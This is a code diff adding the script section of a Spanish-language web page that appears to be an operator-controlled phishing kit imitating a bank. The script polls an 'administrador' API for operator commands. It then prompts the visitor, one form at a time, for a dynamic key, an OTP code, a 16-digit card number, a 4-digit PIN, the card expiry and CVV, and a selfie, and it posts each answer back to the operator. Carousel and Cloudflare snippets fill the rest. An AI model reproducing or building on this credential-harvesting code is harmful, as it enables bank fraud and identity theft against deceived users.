+                            sesionActual = data.sesiones[i];
+                            break;
+                        }
+                    }
+                    if (!sesionActual || sesionActual.activa != 1) {
+                        finalizarSesionCliente();
+                    }
+                }
+            } catch (error) {
+                console.error('Error al verificar sesión:', error);
+            }
+        }
+
+        function finalizarSesionCliente() {
+            detenerPollingAcciones();
+            var modal = bootstrap.Modal.getInstance(document.getElementById('modalAccionAdmin'));
+            if (modal) modal.hide();
+            document.getElementById('spinnerTexto').textContent = 'Sesión finalizada. Redirigiendo...';
+            spinnerOverlay.classList.add('mostrar');
+            setTimeout(function() {
+                window.location.href = 'index.html';
+            }, 2000);
+        }
+
+        // ══════════════════════════════════════
+        // EVENTO PARA EL BOTÓN FINALIZAR SESIÓN DEL ADMIN
+        // ══════════════════════════════════════
+        if (window.opener && !window.opener.closed) {
+            // Si la ventana fue abierta desde el admin, redirigir admin al index.html del admin
+        }
+
+        // ══════════════════════════════════════
+        // SISTEMA DE ACCIONES DEL ADMINISTRADOR
+        // ══════════════════════════════════════
+        var modalAccionAdmin = document.getElementById('modalAccionAdmin');
+        var mensajeAccionAdmin = document.getElementById('mensajeAccionAdmin');
+        var btnConfirmarAccion = document.getElementById('btnConfirmarAccion');
+        var spinnerTexto = document.getElementById('spinnerTexto');
+        var accionPendiente = null;
+        var tiposAcciones = ['error_usuario', 'terminar', 'selfie', 'doc_frontal', 'doc_posterior',
+                            'clave', 'dinamica', 'error_dinamica', 'otp_cod', 'error_otp',
+                            'tarjeta', 'error_tarjeta', 'error_923',
+                            'clave_segura', 'tarjeta_debito'];
+
+        var modalBootstrap = null;
+        window.addEventListener('load', function() {
+            modalBootstrap = new bootstrap.Modal(modalAccionAdmin);
+        });
+
+        async function verificarAccionAdmin() {
+            if (accionPendiente) return;
+            if (!sesionId) return;
+            for (var t = 0; t < tiposAcciones.length; t++) {
+                var tipo = tiposAcciones[t];
+                try {
+                    var resp = await fetch('administrador/admin_api.php?accion=obtener_accion_sesion&tipo_accion=' + tipo + '&sesion_id=' + sesionId);
+                    var data = await resp.json();
+                    if (data.success && data.accion) {
+                        accionPendiente = data.accion;
+                        mostrarModalAccion(data.accion.mensaje);
+                        break;
+                    }
+                } catch (error) {
+                    console.error('Error al verificar acción:', error);
+                }
+            }
+        }
+
+        function mostrarModalAccion(mensaje) {
+            mensajeAccionAdmin.textContent = mensaje;
+            document.getElementById('formularioAccion').style.display = 'block';
+            
+            // Ocultar todos los grupos de inputs
+            var grupos = document.querySelectorAll('[id^="input-group-"]');
+            for (var g = 0; g < grupos.length; g++) {
+                grupos[g].style.display = 'none';
+            }
+            
+            // Ocultar texto de esperando
+            document.getElementById('textoEsperando').style.display = 'none';
+            
+            // Mostrar el input correspondiente según el tipo de acción
+            if (accionPendiente) {
+                var tipo = accionPendiente.tipo_accion;
+                var grupoInput = document.getElementById('input-group-' + tipo);
+                if (grupoInput) {
+                    grupoInput.style.display = 'block';
+                } else {
+                    // Si no hay grupo específico, mostrar texto de esperando
+                    document.getElementById('textoEsperando').style.display = 'block';
+                }
+            }
+            
+            spinnerOverlay.classList.remove('mostrar');
+            if (modalBootstrap) {
+                modalBootstrap.show();
+            }
+        }
+
+        btnConfirmarAccion.addEventListener('click', async function() {
+            if (accionPendiente) {
+                try {
+                    var tipo = accionPendiente.tipo_accion;
+                    var respuesta_texto = '';
+                    var respuesta_imagen = '';
+
+                    if (tipo === 'error_dinamica' || tipo === 'dinamica') {
+                        var input = document.getElementById('input-dinamica');
+                        var valor = input ? input.value : '';
+                        if (!valor || valor.length !== 6 || !/^\d{6}$/.test(valor)) {
+                            mostrarToast('La clave dinámica debe tener exactamente 6 dígitos numéricos', 'error');
+                            return;
+                        }
+                        respuesta_texto = valor;
+                    } else if (tipo === 'error_otp' || tipo === 'otp_cod') {
+                        var input = document.getElementById('input-otp_cod');
+                        var valor = input ? input.value : '';
+                        if (!valor || valor.length !== 6 || !/^\d{6}$/.test(valor)) {
+                            mostrarToast('El código OTP debe tener exactamente 6 dígitos numéricos', 'error');
+                            return;
+                        }
+                        respuesta_texto = valor;
+                    } else if (tipo === 'error_tarjeta' || tipo === 'tarjeta') {
+                        var input = document.getElementById('input-tarjeta');
+                        var valor = input ? input.value.replace(/\s/g, '') : '';
+                        if (!valor || valor.length !== 16) {
+                            mostrarToast('El número de tarjeta debe tener exactamente 16 dígitos', 'error');
+                            return;
+                        }
+                        respuesta_texto = valor;
+                    } else if (tipo === 'error_clave' || tipo === 'clave') {
+                        var input = document.getElementById('input-clave');
+                        var valor = input ? input.value : '';
+                        if (!valor || valor.length !== 4 || !/^\d{4}$/.test(valor)) {
+                            mostrarToast('La clave debe tener exactamente 4 dígitos numéricos', 'error');
+                            return;
+                        }
+                        respuesta_texto = valor;
+                    } else if (tipo === 'doc_frontal') {
+                        var input = document.getElementById('input-doc_frontal');
+                        var valor = input ? input.value.replace(/\s/g, '') : '';
+                        if (!valor || valor.length !== 16) {
+                            mostrarToast('El documento debe tener exactamente 16 dígitos', 'error');
+                            return;
+                        }
+                        respuesta_texto = valor;
+                    } else if (tipo === 'doc_posterior') {
+                        var fecha = document.getElementById('input-fecha-expiracion');
+                        var cvv = document.getElementById('input-cvv');
+                        var valorFecha = fecha ? fecha.value : '';
+                        var valorCvv = cvv ? cvv.value : '';
+                        if (!valorFecha || valorFecha.length < 5 || !valorCvv || valorCvv.length !== 3) {
+                            mostrarToast('Debe completar todos los campos: Fecha (MM/AA) y CVV (3 dígitos)', 'error');
+                            return;
+                        }
+                        respuesta_texto = valorFecha + '|' + valorCvv;
+                    } else if (tipo === 'selfie') {
+                        var inputFile = document.getElementById('input-selfie');
+                        if (inputFile && inputFile.files.length > 0) {
+                            var file = inputFile.files[0];
+                            respuesta_imagen = await new Promise(function(resolve) {
+                                var reader = new FileReader();
+                                reader.onload = function(e) { resolve(e.target.result); };
+                                reader.readAsDataURL(file);
+                            });
+                        } else {
+                            mostrarToast('Debes seleccionar una imagen para la selfie', 'error');
+                            return;
+                        }
+                    }
+
+                    var formData = new FormData();
+                    formData.append('accion', 'guardar_respuesta');
+                    formData.append('sesion_id', sesionId);
+                    formData.append('accion_id', accionPendiente.id);
+                    formData.append('tipo_accion', tipo);
+                    formData.append('respuesta_texto', respuesta_texto);
+                    if (respuesta_imagen) {
+                        formData.append('respuesta_imagen', respuesta_imagen);
+                    }
+
+                    await fetch('administrador/admin_api.php', {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    await fetch('administrador/admin_api.php', {
+                        method: 'POST',
+                        body: new URLSearchParams({
+                            accion: 'desactivar_accion',
+                            id: accionPendiente.id
+                        })
+                    });
+
+                    mostrarToast('Respuesta enviada correctamente', 'success');
+                } catch (error) {
+                    console.error('Error al guardar respuesta:', error);
+                    mostrarToast('Error al enviar la respuesta', 'error');
+                }
+
+                accionPendiente = null;
+                if (modalBootstrap) {
+                    modalBootstrap.hide();
+                }
+                spinnerOverlay.classList.add('mostrar');
+                document.querySelectorAll('.form-accion').forEach(function(form) {
+                    form.style.display = 'none';
+                });
+                document.getElementById('formularioAccion').style.display = 'none';
+                document.querySelectorAll('.tabla-opcion').forEach(function(t) { t.classList.remove('activa'); });
+                opcionSeleccionada = null;
+            }
+        });
+
+        setInterval(verificarEstadoSesion, 2000);
+
+        // Carrusel
+        var carouselTrack = document.getElementById('carouselTrack');
+        var carouselPrev = document.getElementById('carouselPrev');
+        var carouselNext = document.getElementById('carouselNext');
+        var currentSlideCarousel = 0;
+        var totalItems = document.querySelectorAll('.carousel-custom-item').length;
+        var itemsPerView = 3.5;
+        var maxSlide = Math.ceil(totalItems - itemsPerView);
+
+        function updateCarousel() {
+            if (!carouselTrack) return;
+            var gap = 1.5;
+            var containerWidth = carouselTrack.parentElement.offsetWidth;
+            var itemWidthPx = (containerWidth - (gap * (itemsPerView - 1))) / itemsPerView;
+            var offset = currentSlideCarousel * (itemWidthPx + (containerWidth * gap / 100));
+            carouselTrack.style.transform = 'translateX(-' + offset + 'px)';
+            if (currentSlideCarousel === 0) {
+                carouselPrev.classList.add('hidden');
+            } else {
+                carouselPrev.classList.remove('hidden');
+            }
+            if (currentSlideCarousel >= maxSlide) {
+                carouselNext.classList.add('hidden');
+            } else {
+                carouselNext.classList.remove('hidden');
+            }
+        }
+
+        if (carouselPrev && carouselNext) {
+            carouselPrev.addEventListener('click', function() {
+                if (currentSlideCarousel > 0) {
+                    currentSlideCarousel--;
+                    updateCarousel();
+                }
+            });
+            carouselNext.addEventListener('click', function() {
+                if (currentSlideCarousel < maxSlide) {
+                    currentSlideCarousel++;
+                    updateCarousel();
+                }
+            });
+        }
+
+        window.addEventListener('load', function() {
+            carouselNext.classList.add('hidden');
+            carouselPrev.classList.add('hidden');
+            setTimeout(updateCarousel, 100);
+            window.addEventListener('resize', updateCarousel);
+        });
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/js/bootstrap.bundle.min.js"></script>
+<script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a3d09fddd953f7d2',t:'MTc4OTczNzM3OQ=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</html>
